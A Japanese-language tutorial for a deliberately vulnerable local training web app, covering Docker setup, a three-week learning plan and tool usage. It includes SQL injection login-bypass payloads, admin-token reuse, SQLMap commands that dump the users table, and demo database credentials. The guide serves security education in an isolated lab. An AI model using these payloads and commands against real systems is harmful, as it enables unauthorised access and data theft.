# セキュリティテスト入門ガイド

## 🎯 このガイドについて

このガイドでは、構築した脆弱なアプリケーションを使用して、実践的なセキュリティテストを開始する方法を説明します。

## 📋 前提条件

### 必要なツール

1. **Docker & Docker Compose**
   - アプリケーション環境の構築に使用

2. **Node.js 18以上**
   - バックエンド・フロントエンドの実行に必要

3. **セキュリティテストツール**
   - OWASP ZAP
   - Burp Suite Community Edition
   - SQLMap
   - curl または Postman

### 推奨する知識

- HTTP/HTTPSプロトコルの基礎
- SQLの基本的な知識
- JavaScriptの基礎
- コマンドラインの基本操作

## 🚀 環境のセットアップ

### ステップ1: プロジェクトの準備

```bash
cd security-learning-project/vulnerable-app

# 環境変数ファイルのコピー
cp backend/.env.example backend/.env

# 必要なディレクトリの作成
mkdir -p backend/uploads backend/logs
```

### ステップ2: Dockerコンテナの起動

```bash
# すべてのサービスを起動
docker-compose up -d

# ログの確認
docker-compose logs -f

# サービスの状態確認
docker-compose ps
```

起動するサービス:

- PostgreSQL (ポート 5432)
- MongoDB (ポート 27017)
- Backend API (ポート 3000)
- Frontend (ポート 3001)
- Adminer (ポート 8080)

### ステップ3: 動作確認

```bash
# ヘルスチェック
curl http://localhost:3000/health

# データベース接続確認
# ブラウザで http://localhost:8080 を開く
# サーバー: postgres
# ユーザー名: vulnapp
# パスワード: insecure_password_123
# データベース: vulnerable_app
```

## 🔍 基本的なテストの流れ

### 1. アプリケーションの理解

まず、アプリケーションの機能を理解します：

```bash
# 利用可能なエンドポイントの確認
curl http://localhost:3000/health | jq

# ユーザー登録
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "testuser",
    "email": "test@example.com",
    "password": "password123"
  }' | jq

# ログイン
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "testuser",
    "password": "password123"
  }' | jq
```

### 2. 脆弱性の探索

#### 手動テスト

```bash
# SQLインジェクションのテスト
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin'\'' OR '\''1'\''='\''1",
    "password": "anything"
  }' | jq

# 結果を確認
# - ログインに成功するか？
# - エラーメッセージに機密情報が含まれているか？
# - SQLクエリが露出しているか？
```

#### 自動スキャン（OWASP ZAP）

```bash
# ZAPをヘッドレスモードで起動
docker run -u zap -p 8090:8090 \
  -v $(pwd):/zap/wrk/:rw \
  -t owasp/zap2docker-stable \
  zap-baseline.py \
  -t http://host.docker.internal:3000 \
  -r zap-report.html
```

### 3. 脆弱性の悪用

発見した脆弱性を実際に悪用してみます：

```bash
# 例: SQLインジェクションでadminとしてログイン
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin'\''--",
    "password": ""
  }' | jq

# 取得したトークンを保存
TOKEN="eyJhbGc..."

# 管理者権限でAPIを呼び出し
curl http://localhost:3000/api/admin/users \
  -H "Authorization: Bearer $TOKEN" | jq
```

### 4. 影響の評価

- どのような情報が漏洩したか？
- どのような操作が可能になったか？
- ビジネスへの影響は？

### 5. レポート作成

発見した脆弱性を文書化します：

```markdown
## 脆弱性レポート

### タイトル
SQLインジェクションによる認証バイパス

### 深刻度
Critical (CVSS 9.8)

### 概要
ログインエンドポイントにSQLインジェクション脆弱性が存在し、
認証をバイパスして任意のユーザーとしてログイン可能。

### 再現手順
1. POST /api/auth/login にリクエスト
2. username に "admin'--" を入力
3. password は任意の値
4. 認証に成功し、adminのトークンが取得できる

### 影響
- すべてのユーザーアカウントへの不正アクセス
- 機密データの漏洩
- データの改ざん・削除

### 対策
パラメータ化クエリの使用
```

## 📚 学習パス

### Week 1: 基礎編

**Day 1-2: 環境構築と基本操作**

- [ ] Docker環境のセットアップ
- [ ] アプリケーションの動作確認
- [ ] 基本的なAPIの使用方法を理解

**Day 3-4: SQLインジェクション**

- [ ] SQLインジェクションの基礎を学習
- [ ] 手動でSQLインジェクションを実行
- [ ] SQLMapを使用した自動テスト

**Day 5-7: XSS（クロスサイトスクリプティング）**

- [ ] XSSの種類を理解（Stored/Reflected/DOM-based）
- [ ] 各種XSS攻撃を実行
- [ ] XSSの影響を評価

### Week 2: 中級編

**Day 8-10: 認証・認可の脆弱性**

- [ ] 弱いパスワードポリシーの悪用
- [ ] セッション管理の脆弱性
- [ ] JWT の脆弱性

**Day 11-12: CSRF**

- [ ] CSRFの仕組みを理解
- [ ] CSRF攻撃を実行
- [ ] 対策方法を学習

**Day 13-14: セキュリティ設定ミス**

- [ ] CORS設定の問題
- [ ] セキュリティヘッダーの欠如
- [ ] 機密情報の露出

### Week 3: 上級編

**Day 15-17: APIセキュリティ**

- [ ] レート制限の欠如
- [ ] 過度なデータ露出
- [ ] 不適切な入力検証

**Day 18-19: 総合演習**

- [ ] 複数の脆弱性を組み合わせた攻撃
- [ ] 完全なペネトレーションテストの実施
- [ ] 詳細なレポート作成

**Day 20-21: 修正と再テスト**

- [ ] 脆弱性の修正実装
- [ ] セキュアコーディングの適用
- [ ] 修正後の検証

## 🛠️ ツールの使い方

### OWASP ZAP

```bash
# インストール（macOS）
brew install --cask owasp-zap

# 起動
open -a "OWASP ZAP"

# 基本的な使い方
1. Automated Scan を選択
2. URL に http://localhost:3000 を入力
3. Attack を開始
4. 結果を確認
```

### Burp Suite

```bash
# インストール
# https://portswigger.net/burp/communitydownload からダウンロード

# プロキシ設定
1. Burp Suite を起動
2. Proxy > Options で 127.0.0.1:8080 を確認
3. ブラウザのプロキシ設定を変更
4. HTTP History でリクエストを確認
```

### SQLMap

```bash
# インストール（macOS）
brew install sqlmap

# 基本的な使い方
sqlmap -u "http://localhost:3000/api/auth/login" \
  --data='{"username":"test","password":"test"}' \
  --method=POST \
  --headers="Content-Type: application/json" \
  --batch

# データベース列挙
sqlmap -u "http://localhost:3000/api/auth/login" \
  --data='{"username":"test","password":"test"}' \
  --method=POST \
  --dbs

# テーブルダンプ
sqlmap -u "http://localhost:3000/api/auth/login" \
  --data='{"username":"test","password":"test"}' \
  --method=POST \
  -D vulnerable_app \
  -T users \
  --dump
```

## 📝 ベストプラクティス

### テスト実施時の注意点

1. **隔離された環境で実施**
   - 本番環境では絶対にテストしない
   - ローカル環境またはテスト専用環境を使用

2. **記録を残す**
   - すべてのテスト手順を記録
   - スクリーンショットを保存
   - コマンド履歴を保存

3. **倫理的に実施**
   - 許可された範囲内でのみテスト
   - 発見した脆弱性は責任を持って報告

4. **段階的に学習**
   - 基礎から順番に学習
   - 理解できるまで次に進まない
   - 実践と理論を組み合わせる

## 🆘 トラブルシューティング

### よくある問題

**問題: Dockerコンテナが起動しない**

```bash
# ログを確認
docker-compose logs

# コンテナを再起動
docker-compose down
docker-compose up -d
```

**問題: データベースに接続できない**

```bash
# PostgreSQLの状態確認
docker-compose exec postgres psql -U vulnapp -d vulnerable_app -c "SELECT 1"

# データベースの再初期化
docker-compose down -v
docker-compose up -d
```

**問題: ポートが既に使用されている**

```bash
# 使用中のポートを確認
lsof -i :3000
lsof -i :5432

# プロセスを終了
kill -9 <PID>
```

## 📚 参考リソース

### 公式ドキュメント

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

### 学習プラットフォーム

- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [PentesterLab](https://pentesterlab.com/)

### コミュニティ

- [OWASP Slack](https://owasp.org/slack/invite)
- [Bug Bounty Forum](https://bugbountyforum.com/)
- [Reddit r/netsec](https://www.reddit.com/r/netsec/)

## 🎓 次のステップ

1. 環境をセットアップする
2. 基本的なテストを実行する
3. 各脆弱性のドキュメントを読む
4. 実際に攻撃を試す
5. 対策を実装する
6. 学習成果をまとめる

---

**準備ができたら、実際のテストを開始しましょう！**

まずは `documentation/vulnerabilities/01-SQL-INJECTION.md` から始めることをお勧めします。
